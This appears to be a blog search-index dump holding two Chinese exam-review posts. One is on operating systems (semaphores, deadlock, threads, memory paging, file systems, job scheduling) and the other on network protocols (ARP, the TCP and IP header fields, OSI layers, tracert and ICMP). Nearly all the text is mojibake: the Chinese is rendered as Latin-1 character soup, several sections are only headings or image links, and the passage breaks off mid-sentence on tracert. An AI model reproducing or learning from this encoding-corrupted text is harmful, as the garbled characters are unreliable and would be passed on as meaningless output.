ï¼ˆé€‰æ‹©ã€åˆ¤æ–­ã€å¡«ç©ºï¼‰\n\nåŸè¯­æ˜¯æ“ä½œç³»ç»Ÿä¸­å®Œæˆä¸€äº›ç‰¹å®šåŠŸèƒ½çš„ã€ä¸å¯ä¸­æ–­çš„è¿‡ç¨‹\nPã€Væ“ä½œæ˜¯ä¸å¯ä¸­æ–­çš„ç¨‹åºæ®µï¼Œç§°ä¸ºåŸè¯­\n\n##### æ€ä¹ˆç”¨ä¿¡å·é‡å’Œ Pã€V æ“ä½œåŸè¯­æ¥å®ç°å¯¹è¿›ç¨‹åŒæ­¥çš„æ§åˆ¶ï¼ˆè¦å†™å‡ºä»£ç ï¼‰ã€‚ï¼ˆç»¼åˆï¼‰\n![](https://img.jwt1399.top//img/20201220161523.png)\n\n![](https://img.jwt1399.top//img/20201220161538.png)\n\n![](https://img.jwt1399.top//img/20201220161552.png)\n\n##### ä»€ä¹ˆæ˜¯æ­»é”ï¼Ÿäº§ç”Ÿæ­»é”çš„æ¡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿè§£å†³æ­»é”çš„æ–¹æ³•ä¸€èˆ¬æœ‰é‚£å‡ ç§?  ï¼ˆç®€ç­”ï¼‰\næ¦‚å¿µï¼šä¸€ç»„å¹¶å‘è¿›ç¨‹å½¼æ­¤æ— ä¼‘æ­¢åœ°ç­‰å¾…å¯¹æ–¹å ç”¨çš„èµ„æºï¼Œä»è€Œé€ æˆä¸èƒ½ç»§ç»­å‘å‰æ¨è¿›çš„çŠ¶æ€ï¼Œç§°ä¸ºè¿›ç¨‹çš„æ­»é”ã€‚\næ­»é”äº§ç”Ÿçš„æ¡ä»¶ï¼šäº’æ–¥æ¡ä»¶ã€ä¸å¯å¼ºå ã€è¯·æ±‚å’Œä¿æŒã€å¾ªç¯ç­‰å¾…\n\nè§£å†³æ­»é”çš„æ–¹æ³•ï¼šé¢„é˜²æ­»é”ã€é¿å…æ­»é”ã€æ£€æµ‹æ­»é”ã€è§£é™¤æ­»é”\nï¼ˆ1ï¼‰\té¢„é˜²æ­»é”ï¼šæ‰“ç ´æ­»é”å‘ç”Ÿçš„å››ä¸ªå¿…è¦æ¡ä»¶ä¹‹ä¸€\n![](https://img.jwt1399.top//img/20201220161603.png)\nï¼ˆ2ï¼‰\n\n![](https://img.jwt1399.top//img/20201220161636.png)\n\n##### ä»€ä¹ˆæ˜¯çº¿ç¨‹ï¼Ÿåœ¨æ“ä½œç³»ç»Ÿä¸­å¼•å…¥çº¿ç¨‹çš„ä¸»è¦ç›®çš„æ˜¯ï¼Ÿçº¿ç¨‹ä¸è¿›ç¨‹çš„åŒºåˆ«æ˜¯ï¼Ÿ \nçº¿ç¨‹æ˜¯è¿›ç¨‹çš„å†…çš„ä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„å¯è°ƒåº¦çš„æ‰§è¡Œå•å…ƒï¼Œä¸€ä¸ªè¿›ç¨‹å¯å«æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œå®ƒä»¬å¯ä»¥å¹¶å‘æ‰§è¡Œï¼Œå…±äº«è¿›ç¨‹çš„å…¨éƒ¨èµ„æºã€‚\n\nå¼•å…¥çº¿ç¨‹çš„ç›®çš„ï¼šå‡å°ç¨‹åºåœ¨å¹¶å‘æ‰§è¡Œæ—¶æ‰€ä»˜å‡ºçš„æ—¶ç©ºå¼€é”€ï¼Œæé«˜æ“ä½œç³»ç»Ÿçš„å¹¶å‘æ€§èƒ½ã€‚\n\nè¿›ç¨‹æ˜¯ä»»åŠ¡è°ƒåº¦çš„å•ä½ï¼Œä¹Ÿæ˜¯ç³»ç»Ÿèµ„æºçš„åˆ†é…å•ä½ï¼›è€Œçº¿ç¨‹æ˜¯è¿›ç¨‹ä¸­çš„ä¸€æ¡æ‰§è¡Œè·¯å¾„ï¼Œå½“ç³»ç»Ÿæ”¯æŒå¤šçº¿ç¨‹å¤„ç†æ—¶ï¼Œçº¿ç¨‹æ˜¯ä»»åŠ¡è°ƒåº¦çš„å•ä½ï¼Œä½†ä¸æ˜¯ç³»ç»Ÿèµ„æºçš„åˆ†é…å•ä½ã€‚çº¿ç¨‹å®Œå…¨ç»§æ‰¿çˆ¶è¿›ç¨‹å æœ‰çš„èµ„æºï¼Œå½“å®ƒæ´»åŠ¨æ—¶ï¼Œå…·æœ‰è‡ªå·±çš„è¿è¡Œç°åœºã€‚\n##### ä»€ä¹ˆæ˜¯é™æ€åœ°å€æ˜ å°„ï¼Ÿå®ƒæŒ‡çš„æ˜¯ï¼Ÿ\nåœ¨ç¨‹åºè£…å…¥è¿‡ç¨‹ä¸­éšå³è¿›è¡Œçš„åœ°å€å˜æ¢æ–¹å¼æˆ ä¸ºé™æ€åœ°å€æ˜ å°„æˆ–é™æ€é‡å®šä½ã€‚\næŒ‡å½“å°†ä¸€åœ°å€ç©ºé—´è£…å…¥åˆ°ä¸»å­˜ä¸­çš„ä»»ä¸€ä½ç½®æ—¶ï¼Œè‹¥ç”±ä¸»å­˜è£…å…¥ç¨‹åºå¯¹æœ‰å…³åœ°å€éƒ¨åˆ†è¿›è¡Œè°ƒæ•´ï¼Œåˆ™è¿™æ¬¡ç¡®å®šä¸‹æ¥çš„åœ°å€å°±ä¸å†æ”¹å˜ã€‚\n\n##### åˆ†åŒºå­˜å‚¨ç®¡ç†æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿæœ‰ä»€ä¹ˆå†…å­˜åˆ†é…ç®—æ³•ï¼Ÿå„æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿï¼ˆèƒ½å¯¹åˆ†é…ç®—æ³•è¿›è¡Œå®šæ€§ã€å®šé‡åˆ†æï¼‰ ï¼ˆç®€ç­”ï¼‰\n##### åˆ†é¡µå¼å­˜å‚¨ç®¡ç†ä¸­ï¼Œåœ°å€è½¬æ¢å·¥ä½œæ˜¯æ€æ ·å®Œæˆçš„ï¼Ÿ (ç®€ç­”)\n\n##### ä»€ä¹ˆæ˜¯åˆ†æ®µå¼å­˜å‚¨ç®¡ç†ï¼Ÿåˆ†æ®µå¼å­˜å‚¨ç®¡ç†åœ¨åœ°å€åˆ†é…ä¸Šæœ‰ä»€ä¹ˆåŸºæœ¬ç‰¹å¾ï¼Ÿ\tï¼ˆç®€ç­”ï¼‰   \n\n##### æ®µé¡µå¼å­˜å‚¨ç®¡ç†ä¸­ï¼Œå¦‚ä½•ä»ä¸»å­˜ä¸­å–æŒ‡ä»¤æˆ–å–æ“ä½œæ•°ï¼Ÿ ï¼ˆé€‰ã€å¡«ç©ºï¼‰\n\n##### è¯·æ±‚å¼æ®µé¡µå†…å­˜ç®¡ç†é¡µé¢åˆ‡æ¢ç®—æ³•æœ‰å“ªäº›ï¼Ÿï¼ˆèƒ½å¯¹åˆ‡æ¢ç®—æ³•è¿›è¡Œåˆ†æï¼‰    \n\n##### ä»€ä¹ˆæ˜¯ç®¡æ€ï¼Ÿä»€ä¹ˆæ˜¯ç›®æ€ï¼Ÿä¸­å¤®å¤„ç†å™¨å¤„äºç›®æ€æ—¶ï¼Œæ‰§è¡Œä»€ä¹ˆæŒ‡ä»¤å°†äº§ç”Ÿâ€œéæ³•æ“ä½œâ€äº‹ä»¶ï¼Ÿ ï¼ˆé€‰ã€å¡«ã€åˆ¤ï¼‰\n##### ç£ç›˜æ–‡ä»¶çš„ç‰©ç†ç»“æ„æœ‰å“ªå‡ ç§ï¼Ÿé‚£ç§ç»“æ„æ—¢é€‚åˆé¡ºåºå­˜å–ï¼Œåˆæ–¹ä¾¿éšæœºå­˜å–ï¼Ÿ ï¼ˆå¡«ã€ç®€ç­”ï¼‰\n##### ä¸ºäº†å®ç°è®¾å¤‡çš„ç‹¬ç«‹æ€§ï¼Œæ“ä½œç³»ç»Ÿè®©ç”¨æˆ·ä½¿ç”¨ä»€ä¹ˆæ ·çš„è®¾å¤‡åï¼Ÿ ï¼ˆé€‰ï¼‰\n##### æ–‡ä»¶ç³»ç»Ÿçš„å¤šçº§ç›®å½•ç»“æ„æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ ï¼ˆé€‰ã€å¡«ï¼‰\n##### ä»€ä¹ˆæ˜¯ä½ç¤ºå›¾æ–¹æ³•ï¼Ÿæ“ä½œç³»ç»Ÿå¯ç”¨ä½ç¤ºå›¾æ–¹æ³•è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ ï¼ˆç®€ç­”ï¼‰\n##### ä»€ä¹ˆæ˜¯æ–‡ä»¶ç³»ç»Ÿï¼Ÿæ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶ä¸ºä»€ä¹ˆè¦æŒ‰ç…§åå­—å­˜å–ï¼Ÿ  ï¼ˆç®€ç­”ï¼‰\n##### ä»€ä¹ˆæ˜¯è™šæ‹Ÿè®¾å¤‡ï¼Ÿè™šæ‹Ÿè®¾å¤‡æ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿæœ‰ä»€ä¹ˆæ„ä¹‰ï¼Ÿï¼ˆç®€ç­”ï¼‰ \n##### å­˜æ”¾åœ¨ç£ç›˜ã€ç£å¸¦ä¸Šçš„æ–‡ä»¶ï¼Œå¸¸é‡‡ç”¨çš„ä»€ä¹ˆæ ·çš„ç‰©ç†ç»“æ„ï¼ˆé€‰ï¼‰\n##### ä»€ä¹ˆSPOOL æŠ€æœ¯ï¼ŸSPOOL ç³»ç»Ÿåˆ©ç”¨ä»€ä¹ˆå­˜æ”¾ä½œä¸šä¿¡æ¯å’Œä½œä¸šæ‰§è¡Œç»“æœã€‚ï¼ˆç®€ç­”ã€å¡«ç©ºï¼‰\n\n##### æ“ä½œç³»ç»Ÿä¸ºäº†è°ƒèŠ‚ä¸åŒéƒ¨ä»¶çš„ä¼ è¾“é€Ÿåº¦ï¼Œå¯ä»¥é‡‡ç”¨ç¼“å†²æŠ€æœ¯ï¼Œç¼“å†²æŠ€æœ¯åŒ…å«å“ªäº›åŸºæœ¬æŠ€æœ¯ï¼Ÿæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿï¼ˆç®€ç­”ï¼‰\n##### å¦‚æœ I/O è®¾å¤‡ä¸å­˜å‚¨è®¾å¤‡è¿›è¡Œæ•°æ®ç›´æ¥äº¤æ¢ï¼Œç§°ä¸ºä»€ä¹ˆæ–¹å¼ï¼Ÿå¼•èµ·ä¸­æ–­å‘ç”Ÿçš„äº‹ä»¶ç§°ä¸ºï¼Ÿ ï¼ˆé€‰ã€å¡«ï¼‰\n\n##### æ–‡ä»¶ç³»ç»Ÿè®¾ç½®æ–‡ä»¶ç›®å½•çš„ç›®çš„æ˜¯ä»€ä¹ˆ? æ–‡ä»¶ç›®å½•ç»„ç»‡éƒ½æœ‰å“ªå‡ ç§å½¢å¼? ï¼ˆåˆ¤ã€å¡«ç©ºã€ç®€ç­”ï¼‰\n##### åœ¨ä¸€ä¸ªæ®µå¼å­˜å‚¨ç®¡ç†ç³»ç»Ÿä¸­ï¼Œæ®µè¡¨å†…å®¹å¦‚ä¸‹ï¼š ï¼ˆç»¼åˆï¼‰\n![](https://img.jwt1399.top//img/20201220161711.png)\n\n\n##### è¯•æ±‚ä¸‹è¿°é€»è¾‘åœ°å€å¯¹åº”çš„ç‰©ç†åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ \n![](https://img.jwt1399.top//img/20201220161701.png)\n##### åœ¨å•é“ç³»ç»Ÿä¸­ï¼Œè®¾æœ‰å››é“ä½œä¸šï¼Œå®ƒä»¬çš„æäº¤æ—¶é—´å’Œæ‰§è¡Œæ—¶é—´å¦‚ä¸‹è¡¨ï¼š  ï¼ˆç»¼åˆï¼‰\n\n![](https://img.jwt1399.top//img/20201220161727.png)\n\n##### è¯·é‡‡ç”¨ FCFS,SJF,é«˜å“åº”æ¯”ä¼˜å…ˆè°ƒåº¦ç®—æ³•åˆ†åˆ«è¡¥å……å®Œå–„ä¸Šè¡¨ï¼Œå¹¶è®¡ç®—å¹³å‡å‘¨è½¬æ—¶é—´å’Œå¹³å‡å¸¦æƒå‘¨è½¬æ—¶é—´ã€‚ï¼ˆæ‰€æœ‰è®¡ç®—æœ€å¤šä¿ç•™ 2 ä½å°æ•°ï¼‰\n\n","tags":["æ“ä½œç³»ç»Ÿ"],"categories":["CSåŸºç¡€"]},{"title":"ç½‘ç»œåè®®åˆ†æå¤ä¹ ","url":"/posts/49277.html","content":"#### 1ã€å¿…é¡»æŒæ¡ARPåè®®çš„æ ¼å¼ã€å·¥ä½œåŸç†å’Œè¿‡ç¨‹ã€åŠŸèƒ½\n\nARPåè®®çš„æ ¼å¼ï¼š\n![](https://i.loli.net/2019/11/20/mePwdyTufKz7rgl.png)\n![](https://i.loli.net/2019/11/20/SozTD5FNbrCedaW.png)\n[arpæŠ¥æ–‡æ ¼å¼è§£æ](https://www.cnblogs.com/perilong16/p/10933852.html)\n\n#### 2ã€TCP/IPåè®®ç°‡çš„å±‚æ¬¡åŠOSI/RMæ¨¡å‹çš„ç½‘ç»œå±‚æ¬¡åŠå„å±‚çš„ä¸»è¦ä½œç”¨åŠå„å±‚çš„ä¸»è¦åè®®\n\n![](https://i.loli.net/2019/11/20/dP3Cn1O8IYiDrwL.png)\n\n#### 3ã€é¢å‘è¿æ¥ã€æ— è¿æ¥çš„æœ€ä¸»è¦åŒºåˆ«ï¼›å“ªäº›åè®®æ˜¯é¢å‘è¿æ¥çš„ï¼Ÿå“ªäº›åè®®æ˜¯æ— è¿æ¥çš„ï¼Ÿ\n\né¢å‘è¿æ¥åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼Œè€Œé¢å‘æ— è¿æ¥æ²¡æœ‰è¿™ä¹ˆå¤šé˜¶æ®µï¼Œå®ƒç›´æ¥è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚ \né¢å‘è¿æ¥çš„é€šä¿¡å…·æœ‰æ•°æ®çš„ä¿åºæ€§ï¼Œ è€Œé¢å‘æ— è¿æ¥çš„é€šä¿¡ä¸èƒ½ä¿è¯æ¥æ”¶æ•°æ®çš„é¡ºåºä¸å‘é€æ•°æ®çš„é¡ºåºä¸€è‡´ã€‚\né¢å‘è¿æ¥ï¼šTCP\næ— è¿æ¥ï¼šUDPã€IP\n\n#### 4ã€ç†Ÿæ‚‰TCPåè®®é¦–éƒ¨å„å­—æ®µå«ä¹‰åŠä½œç”¨\n\n![](https://i.loli.net/2019/11/20/Fi5tXYTleMoL6gd.png)\n\n```\nô€€\tæºç«¯å£ï¼šè¿™æ˜¯æºè®¾å¤‡å‘å‡ºTCP æ®µçš„è¿›ç¨‹çš„ 16 æ¯”ç‰¹ç«¯å£å·ã€‚\nô€€\tç›®çš„ç«¯å£ï¼šè¿™æ˜¯ç›®çš„è®¾å¤‡ä¸Šä½œä¸ºæœ¬æŠ¥æ–‡æœ€ç»ˆå¸Œæœ›çš„æ¥æ”¶æ–¹è¿›ç¨‹çš„ 16 æ¯”ç‰¹ç«¯å£å·ã€‚\nô€€\tåºåˆ—å·ï¼šåœ¨æ­£å¸¸ä¼ è¾“æƒ…å†µä¸‹ï¼Œè¿™æ˜¯æœ¬æ®µæ•°æ®ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºåˆ—å·ï¼Œåœ¨è¿æ¥è¯·æ±‚ SYNæŠ¥æ–‡ä¸­ï¼Œè¯¥å­—æ®µæºå¸¦äº†æº TCP çš„ ISNï¼Œæ•°æ®ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºåˆ—å·å°†è¢«æŒ‡å®šä¸ºç´§è·Ÿè¯¥å­—æ®µå†…å®¹çš„ä¸‹ä¸€ä¸ªç¼–å·ã€‚\nô€€\tç¡®è®¤åºåˆ—å·ï¼šè‹¥ ACK æ¯”ç‰¹ç½®ä½ï¼Œè¯´æ˜æœ¬æ®µå……å½“ä¸€ä¸ªç¡®è®¤ï¼Œè¯¥å­—æ®µå«æœ‰æºæ­£åœ¨æœŸå¾…çš„ç›®çš„åœ°å°†è¦å‘é€ä¸‹ä¸€ä¸ªåºåˆ—å·ã€‚\nô€€\tæ•°æ®åç§»ï¼šè¯¥é¡¹è¯¦ç»†è¯´æ˜äº† TCP é¦–éƒ¨å«æœ‰å¤šå°‘ä¸ª 32 æ¯”ç‰¹å­—çš„æ•°æ®ï¼Œæ¢å¥è¯è¯´ï¼Œè¯¥å€¼ä¹˜ä»¥ 4 å°±ç­‰äºé¦–éƒ¨å­—èŠ‚æ•°ï¼Œè€Œåè€…å¿…é¡»æ€»æ˜¯ 4 çš„å€æ•°ï¼Œè¯¥å­—æ®µç§°ä¸ºæ•°æ®åç§»æ˜¯å› ä¸ºå®ƒæŒ‡æ˜æ•°æ®èµ·ç‚¹è·TCP æ®µå¼€å¤´åç§»äº†å¤šå°‘ä¸ª 32 æ¯”ç‰¹ã€‚\nô€€\tä¿ç•™ï¼šè¯¥å­—æ®µç•™ç»™å°†æ¥ä½¿ç”¨ï¼Œå‘é€æ—¶ç½® 0ã€‚\nô€€\tURGï¼šç´§æ€¥æŒ‡é’ˆ(urgent pointer)æœ‰æ•ˆï¼Œç½®ä¸º 1 æ—¶ï¼Œè¯´æ˜æ•°æ®æ®µçš„ä¼˜å…ˆæ•°æ®ä¼ è¾“ç‰¹æ€§å·²ç»è¢«æ¿€æ´»ï¼Œä¸”ç´§æ€¥æŒ‡é’ˆå­—æ®µæœ‰æ•ˆã€‚\nô€€\tACKï¼šç¡®è®¤åºå·æœ‰æ•ˆï¼Œç½®ä¸º 1 æ—¶ï¼Œè¯´æ˜æ•°æ®æ®µæºå¸¦ä¸€ä¸ªç¡®è®¤ï¼Œç¡®è®¤ç¼–å·å­—æ®µå€¼æœ‰æ•ˆä¸”æºå¸¦ç€æœŸæœ›ä»æ•°æ®æ®µç›®çš„åœ°æ”¶åˆ°çš„ä¸‹ä¸€ä¸ªåºåˆ—å·ã€‚\nô€€\tPSHï¼šæ¥æ”¶æ–¹åº”è¯¥å°½å¿«å°†è¿™ä¸ªæŠ¥æ–‡æ®µäº¤ç»™åº”ç”¨å±‚ï¼Œæ•°æ®æ®µå‘é€æ–¹æ­£åœ¨ä½¿ç”¨ TCP æ¨ç‰¹æ€§ï¼Œè¯·æ±‚ç«‹å³å°†æ®µä¸­æ•°æ®æ¨å‘æ¥æ”¶è®¾å¤‡ä¸Šçš„åº”ç”¨ç¨‹åºã€‚\nô€€\tRSTï¼šé‡å»ºè¿æ¥\nô€€\tSYNï¼šåŒæ­¥åºå·ç”¨æ¥å‘èµ·ä¸€ä¸ªè¿æ¥ã€‚åºåˆ—å·å­—æ®µå«æœ‰å‘é€æ–¹çš„ ISNã€‚\nô€€\tFINï¼šå‘é€ç«¯æ­£åœ¨è¯·æ±‚è¿æ¥å…³é—­ã€‚\nô€€\tçª—å£ï¼šè¯¥å­—æ®µæŒ‡å‡ºæœ¬ç«¯çš„å‘é€æ–¹æ„¿æ„ä»æ¥æ”¶æ–¹å¤„ä¸€æ¬¡æ¥å—å¤šå°‘ä¸ª8 æ¯”ç‰¹æ•°æ®ã€‚å®ƒé€šå¸¸ç­‰äºåˆ†é…ç»™è¯¥æ¡è¿æ¥ç”¨ä»¥æ¥å—æ•°æ®ç¼“å†²åŒºçš„å½“å‰é•¿åº¦ã€‚\nô€€\tæ ¡éªŒå’Œï¼š16 æ¯”ç‰¹æ£€éªŒå’Œ\nô€€\tç´§æ€¥æŒ‡é’ˆï¼šè¯¥å­—æ®µä¸ URG æ§åˆ¶æ¯”ç‰¹è”åˆç”¨äºä¼˜å…ˆæ•°æ®ä¼ è¾“ï¼Œè¯¥å­—æ®µåŒ…å«äº†ç´§æ€¥æ•°æ®æœ€åä¸€ä¸ªå­—èŠ‚çš„åºåˆ—å·ã€‚\n```\n#### 5ã€TCPçš„ç‰¹ç‚¹åŠå·¥ä½œåŸç†\n\nç‰¹ç‚¹ï¼š\nï¼ˆ1ï¼‰é¢å‘è¿æ¥çš„è¿è¾“å±‚åè®®ï¼›\nï¼ˆ2ï¼‰åŸºäºå­—èŠ‚æµçš„æ–¹å¼ï¼›\nï¼ˆ3ï¼‰å¯é äº¤ä»˜çš„æœåŠ¡ï¼›\nï¼ˆ4ï¼‰æä¾›å…¨åŒå·¥é€šä¿¡\nï¼ˆ5ï¼‰é€šä¿¡è¿æ¥ç»´æŠ¤æ˜¯é¢å‘é€šä¿¡çš„ä¸¤ä¸ªç«¯ç‚¹çš„ï¼Œè€Œä¸è€ƒè™‘ä¸­é—´ç½‘æ®µå’ŒèŠ‚ç‚¹ã€‚\n\n#### 6ã€è®°ä½IPæŠ¥æ–‡é¦–éƒ¨ä¿¡æ¯å„å­—æ®µåŠå„å­—æ®µçš„ä½œç”¨\n\n![](https://i.loli.net/2019/11/20/56YifShH1jxopdq.png)\n\n```\nô€€\tç‰ˆæœ¬ï¼šé•¿åº¦ä¸º 4 æ¯”ç‰¹ï¼Œå«ä¹‰ä¸ºç‰ˆæœ¬å·ï¼Œå¯¹äº IPv4 æ¥è¯´ï¼Œç‰ˆæœ¬å·ä¸º 4ã€‚\nô€€\tæŠ¥å¤´é•¿åº¦ï¼šæŠ¥å¤´é•¿åº¦å­—æ®µä¸º 4 æ¯”ç‰¹ï¼Œç”¨äºè¡¨ç¤º IP æŠ¥å¤´é•¿åº¦ï¼Œåœ¨ IPv4 ä¸­ï¼Œç”±äºé€‰é¡¹å­—æ®µé•¿åº¦å¯å˜ï¼Œå› æ­¤ï¼ŒæŠ¥å¤´é•¿åº¦å¹¶ä¸å›ºå®šï¼ŒæŠ¥å¤´å­—èŠ‚é•¿åº¦ä¸ºè¿™ä¸€å­—æ®µå€¼çš„4 å€ã€‚\nô€€\tä¸šåŠ¡ç±»å‹ï¼šä¸šåŠ¡ç±»å‹å­—æ®µé•¿åº¦ä¸º8 æ¯”ç‰¹ï¼Œä¸»è¦ç”¨äºæ ‡è¯† QOS æœåŠ¡ç­‰çº§ã€‚\nô€€\tæ€»é•¿åº¦ï¼šæ€»é•¿åº¦å­—æ®µå…±16 æ¯”ç‰¹ï¼Œå› æ­¤ IP æŠ¥çš„æœ€å¤§é•¿åº¦ä¸º 65535 å­—èŠ‚ã€‚\nô€€\tæ ‡è¯†ç¬¦ï¼ˆIdentifierï¼‰ï¼šé•¿åº¦16 æ¯”ç‰¹ã€‚è¯¥å­—æ®µå’Œæ ‡è¯†åŠåˆ†æ®µåç§»å­—æ®µè”åˆä½¿ç”¨ï¼Œå¯¹å¤§çš„ä¸Šå±‚æ•°æ®åŒ…è¿›è¡Œåˆ†æ®µï¼ˆfragmentï¼‰æ“ä½œã€‚\nô€€\tæ ‡è®°ï¼ˆFlagsï¼‰ï¼šé•¿åº¦ 3 æ¯”ç‰¹ã€‚è¯¥å­—æ®µç¬¬ä¸€ä½ä¸ä½¿ç”¨ï¼Œç¬¬äºŒä½æ˜¯ DF ä½ï¼ŒDF ä½è®¾ä¸º1 æ—¶è¡¨æ˜è·¯ç”±å™¨ä¸èƒ½å¯¹è¯¥ä¸Šå±‚æ•°æ®åŒ…åˆ†æ®µã€‚å¦‚æœä¸€ä¸ªä¸Šå±‚æ•°æ®åŒ…æ— æ³•åœ¨ä¸åˆ†æ®µçš„æƒ…å†µä¸‹è¿›è¡Œè½¬å‘ï¼Œåˆ™è·¯ç”±å™¨ä¼šä¸¢å¼ƒè¯¥ä¸Šå±‚æ•°æ®åŒ…å¹¶è¿”å›ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ã€‚ç¬¬ä¸‰ä½æ˜¯MFä½ï¼Œå½“è·¯ç”±å™¨å¯¹ä¸€ä¸ªä¸Šå±‚æ•°æ®åŒ…åˆ†æ®µï¼Œåˆ™è·¯ç”±å™¨ä¼šåœ¨é™¤äº†æœ€åä¸€ä¸ªåˆ†æ®µçš„ IP åŒ…çš„åŒ…å¤´ä¸­å°† MF ä½è®¾ä¸º1ã€‚\nô€€\tåˆ†æ®µåç§»ï¼ˆFragment Offsetï¼‰ï¼šé•¿åº¦ 13 æ¯”ç‰¹ã€‚ç”¨äºæŒ‡æ˜åˆ†ç‰‡ IP åŒ…åœ¨åŸ IP åŒ…ä¸­çš„åç§»é‡ã€‚ç”±äº IP åŒ…åœ¨ç½‘ç»œä¸Šä¼ é€çš„æ—¶å€™ä¸ä¸€å®šèƒ½æŒ‰é¡ºåºåˆ°è¾¾ï¼Œè¿™ä¸ªå­—æ®µä¿è¯äº†ç›®æ ‡è·¯ç”±å™¨åœ¨æ¥å—åˆ° IP åŒ…ä¹‹åèƒ½å¤Ÿè¿˜åŸåˆ†æ®µçš„ä¸Šå±‚æ•°æ®åŒ…ã€‚å½“æŸä¸ªåŒ…å«åˆ†æ®µçš„ä¸Šå±‚æ•°æ®åŒ…çš„ IP åŒ…åœ¨ä¼ é€æ—¶ä¸¢å¤±ï¼Œåˆ™æ•´ä¸ªä¸€ç³»åˆ—åŒ…å«åˆ†æ®µçš„ä¸Šå±‚æ•°æ®åŒ…çš„ IP åŒ…éƒ½ä¼šè¢«è¦æ±‚é‡ä¼ ã€‚\nô€€\tç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰ï¼šé•¿åº¦8 æ¯”ç‰¹ã€‚å½“ IP åŒ…è¿›è¡Œä¼ é€æ—¶ï¼Œå…ˆä¼šå¯¹è¯¥å­—æ®µèµ‹äºˆæŸä¸ªç‰¹å®šçš„å€¼ã€‚å½“ IP åŒ…ç»è¿‡æ¯ä¸€ä¸ªè·¯ç”±å™¨çš„æ—¶å€™ï¼Œè·¯ç”±å™¨ä¼šå°† IP åŒ…çš„TTL å€¼å‡å°‘1ã€‚å¦‚æœTTL å‡å°‘ä¸º 0ï¼Œåˆ™è¯¥ IP åŒ…ä¼šè¢«ä¸¢å¼ƒã€‚è¿™ä¸ªå­—æ®µå¯ä»¥é˜²æ­¢ç”±äºè·¯ç”±æ•…éšœè€Œå¯¼è‡´ IP åŒ…åœ¨ç½‘ç»œä¸­ä¸åœè¢«è½¬å‘ã€‚\nô€€\tåè®®å·ï¼ˆProtocolï¼‰ï¼šé•¿åº¦8 æ¯”ç‰¹ã€‚æ ‡è¯†äº†ä¸Šå±‚æ‰€ä½¿ç”¨çš„åè®®ã€‚\nô€€\tæŠ¥å¤´æ ¡éªŒå’Œï¼ˆHeader Checksumï¼‰ï¼šé•¿åº¦16 ä½ï¼Œç”±äº IP åŒ…å¤´æ˜¯å˜é•¿çš„ï¼Œæ‰€ä»¥æä¾›ä¸€ä¸ªå¤´éƒ¨æ ¡éªŒæ¥ä¿è¯ IP åŒ…å¤´ä¸­ä¿¡æ¯çš„æ­£ç¡®æ€§ã€‚\nô€€\tæºå’Œç›®æ ‡åœ°å€ï¼ˆSource and Destination Addressesï¼‰ï¼šè¿™ä¸¤ä¸ªåœ°æ®µéƒ½æ˜¯ 32 æ¯”ç‰¹ã€‚æ ‡è¯†äº†è¿™ä¸ª IP åŒ…çš„èµ·æºå’Œç›®æ ‡åœ°å€ã€‚\nô€€\tå¯é€‰é¡¹ï¼ˆOptionsï¼‰ï¼šè¿™æ˜¯ä¸€ä¸ªå¯å˜é•¿çš„å­—æ®µã€‚è¯¥å­—æ®µç”±èµ·æºè®¾å¤‡æ ¹æ®éœ€è¦æ”¹å†™ã€‚\n```\n#### 7ã€OSIå‚è€ƒæ¨¡å‹ä¸­ï¼Œå„å±‚çš„æ•°æ®ä¼ è¾“å•å…ƒ\n\nç‰©ç†å±‚ï¼šæ¯”ç‰¹\næ•°æ®é“¾è·¯å±‚ï¼šå¸§\nç½‘ç»œå±‚ï¼šæ•°æ®åŒ…\nä¼ è¾“å±‚ï¼šæ•°æ®æ®µ\nä¼šè¯å±‚ã€è¡¨ç¤ºå±‚ã€åº”ç”¨å±‚ï¼šåº”ç”¨æ•°æ®\n\n#### 8ã€tracertå‘½ä»¤å·¥ä½œåŸç†åŠä¸ICMPçš„å…³ç³»ï¼ŒæŒæ¡ICMPåè®®çš„ä½œç”¨\n\n```\ntracertå‘½ä»¤å·¥ä½œåŸç†---linux ä¸Šä¸ºtraceroute\n\nTracert å‘½ä»¤ç”¨ IP ç”Ÿå­˜æ—¶é—´ (TTL) å­—æ®µå’Œ ICMP é”™è¯¯æ¶ˆæ¯æ¥ç¡®å®šä»ä¸€ä¸ªä¸»æœºåˆ°ç½‘ç»œä¸Šå…¶ä»–ä¸»æœºçš„è·¯ç”±ã€‚\n\né¦–å…ˆï¼Œtracerté€å‡ºä¸€ä¸ªTTLæ˜¯1çš„IP æ•°æ®åŒ…åˆ°ç›®çš„åœ°ï¼Œå½“è·¯å¾„ä¸Šçš„ç¬¬ä¸€ä¸ªè·¯ç”±å™¨æ”¶åˆ°è¿™ä¸ªæ•°æ®åŒ…æ—¶ï¼Œå®ƒå°†TTLå‡1ã€‚æ­¤æ—¶ï¼ŒTTLå˜ä¸º0ï¼Œæ‰€ä»¥è¯¥è·¯ç”±å™¨ä¼šå°†æ­¤æ•°æ®åŒ…ä¸¢æ‰ï¼Œå¹¶é€å›ä¸€ä¸ªã€ŒICMP time exceededã€æ¶ˆæ¯ï¼ˆåŒ…æ‹¬å‘IPåŒ…çš„æºåœ°å€ï¼ŒIPåŒ…çš„æ‰€æœ‰å†…å®¹åŠè·¯ç”±å™¨çš„IPåœ°å€ï¼‰ï¼Œtracert æ”¶åˆ°è¿™ä¸ªæ¶ˆæ¯åï¼Œä¾¿çŸ¥é“è¿™ä¸ªè·¯ç”±å™¨å­˜åœ¨äºè¿™ä¸ªè·¯å¾„ä¸Šï¼Œæ¥ç€tracert å†é€å‡ºå¦ä¸€ä¸ªTTLæ˜¯2 çš„æ•°æ®åŒ…ï¼Œå‘ç°ç¬¬2ä¸ªè·¯ç”±å™¨...... tracert 